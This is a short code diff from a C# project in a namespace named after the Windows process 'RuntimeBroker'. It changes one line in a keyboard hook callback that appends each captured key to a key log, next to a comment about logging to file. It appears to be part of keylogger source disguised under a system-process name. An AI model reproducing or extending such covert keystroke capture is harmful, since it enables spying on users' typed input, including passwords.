@@ -1624,7 +1624,7 @@ namespace RuntimeBroker
                 //Console.Write(props["Key"]);
                 //Trace.Write(props["Key"]);
                 // log to file here
-                lastKeyLog.KeyStringBuilder.Append(props["Key"]);
+                lastKeyLog?.KeyStringBuilder.Append(props["Key"]);
             }
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
